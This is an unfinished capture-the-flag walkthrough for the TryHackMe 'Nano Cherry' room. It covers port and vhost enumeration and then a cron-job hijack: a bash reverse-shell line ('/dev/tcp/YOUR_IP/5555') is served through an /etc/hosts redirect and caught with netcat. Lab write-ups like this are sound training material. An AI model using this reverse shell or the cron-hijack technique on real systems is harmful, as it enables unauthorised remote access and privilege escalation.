# Tryhackme NanoCherryCTF

## What is it ?

A writeup for [tryhackme Nano Cherry CTF](https://tryhackme.com/r/room/nanocherryctf)
This writeup is not complete as I still trying to solve the challenge

## Initial foothold

### Nmap discovery :

```bash
┌──(david㉿kali)-[~]
└─$ sudo nmap -p- -sV -sC 10.10.68.252 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-06 13:43 CEST
Nmap scan report for cherryontop.thm (10.10.68.252)
Host is up (0.043s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9e:e6:fd:19:23:a3:b1:40:77:1c:a4:c4:2f:e6:d3:4b (ECDSA)
|_  256 15:2b:23:73:3f:c8:8a:a3:b4:aa:1d:ae:70:d4:5f:ae (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Cherry on Top Ice Cream Shop
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.79 seconds
```
### Directory scan with gobuster

```bash
┌──(david㉿kali)-[~]
└─$ gobuster dir -u http://10.10.68.252 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.68.252
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.68.252/images/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.68.252/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.68.252/js/]
/bootstrap            (Status: 301) [Size: 316] [--> http://10.10.68.252/bootstrap/]
/jquery               (Status: 301) [Size: 313] [--> http://10.10.68.252/jquery/]
/server-status        (Status: 403) [Size: 277]
Progress: 441120 / 441122 (100.00%)
===============================================================
Finished
===============================================================
```

### Virtual host scan with gobuster 

```bash
┌──(david㉿kali)-[~/tryhackme_ctf]
└─$ gobuster vhost -u http://cherryontop.thm/ -w /usr/share/wordlists/dns/bitquark-subdomains-top100000.txt --append-domain 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://cherryontop.thm/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/dns/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: nano.cherryontop.thm Status: 200 [Size: 10718]
```

We found one subdomain ``nano.cherryontop.thm`` we add it to ``/etc/hosts`` :
```bash
echo '10.10.68.252 nano.cherryontop.thm' | sudo tee -a /etc/hosts
```

### Connect via ssh to the machine with the credentials provided in the challenge 

Username: notsus
Password: dontbeascriptkiddie

```bash
┌──(david㉿kali)-[~/tryhackme_ctf]
└─$ ssh notsus@10.10.68.252
```
In the home directory there's two files backdoor.mp4 and youFoundIt.txt

We cat the txt file :

```bash
$ cat youFoundIt.txt
Hey good work hacker. Glad you made it this far!

From here, we should be able to hit Bob-Boba where it hurts! Could you find a way to escalate your privileges vertically to access his account?

Keep your's eyes peeled and don't be a script kiddie!
```
So we know we have to escalte to ``Bob-Boba`` user !

I copied with scp the backdoor.mp4 file into my local computer :

```bash
┌──(david㉿kali)-[~/tryhackme/NanoCherryCTF]
└─$ scp notsus@10.10.68.252:/home/.notsus/backdoor.mp4 /home/david/tryhackme/NanoCherryCTF
```
And check the exif data with exiftool but couldn't find anything relevant.

## Privilege escalation to Bob-Boba user :

I start a simple python server to retrieve the linpeas executable :

On my local machine : 

```bash
┌──(david㉿kali)-[~/tryhackme]
└─$ python3 -m http.server                                       
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.68.252 - - [06/Jul/2024 14:30:46] "GET /linpeas.sh HTTP/1.1" 200 -
```
On the remote host :
```bash
$ wget http://10.11.92.0:8000/linpeas.sh
```
From the LinPeas output I found a interesting cron job run as bob-boba :
![LinPeas output](https://image.noelshack.com/fichiers/2024/27/6/1720271405-screenshot-from-2024-07-06-15-08-20.png)

Unfortunately we cannot acces the file :
```bash
$ ls -la /home/bob-boba/coinflip.sh    
ls: cannot access '/home/bob-boba/coinflip.sh': Permission denied
```
But we can modify /etc/hosts file 
First in our local machine we create the same structured folder as curled by the cron job :

```bash
┌──(david㉿kali)-[~/tryhackme]
└─$ mkdir -p home/bob-boba        
```
Then we add our payload (a reverse shell in bash) to our coinflip.sh file :

```bash                                                                               
┌──(david㉿kali)-[~/tryhackme/home/bob-boba]
└─$ echo 'sh -i >& /dev/tcp/YOUR_IP/5555 0>&1' > coinflip.sh
```

We start a simple python server on port 8000 at the root of our folder :

```bash
┌──(david㉿kali)-[~/tryhackme]
└─$ python3 -m http.server 8000
*Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Then we set a listener with netcat :
```bash
┌──(david㉿kali)-[~]
└─$ nc -lnvp 5555
listening on [any] 5555 ...
```

Then we modify on the remote host /etc/hosts file and add the following entrance :
YOUR_IP cherryontop.tld

After a few seconds you will receive a connection on our netcat listener congrats we have escalated to bob-boba :

![Reverse shell](https://www.noelshack.com/2024-27-6-1720272556-screenshot-from-2024-07-06-15-28-38.png)

We stabilize our reverse shell as stated in this [page](https://maxat-akbanov.com/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal)

Here we have the flag number 3 :

![Flag number 3](https://image.noelshack.com/fichiers/2024/27/6/1720272868-screenshot-from-2024-07-06-15-34-11.png)

## XSS on content.php page 
![XSS](https://image.noelshack.com/fichiers/2024/27/6/1720277908-screenshot-from-2024-07-06-16-58-01.jpg)

## Acces the admin portal 

Back on the foothold we had discovered a subdomain : nano.cherryontop.thm
On this subdomain there is a admin portal :

![admin portal](https://image.noelshack.com/fichiers/2024/27/6/1720273732-screenshot-from-2024-07-06-15-48-27.jpg)

Let's try to see if there is an SQLi. We open burpsuite and send the request to the repeater then save it.
```bash
┌──(david㉿kali)-[~/tryhackme]
└─$ sqlmap -r request.req     
```
Result in nothing. 



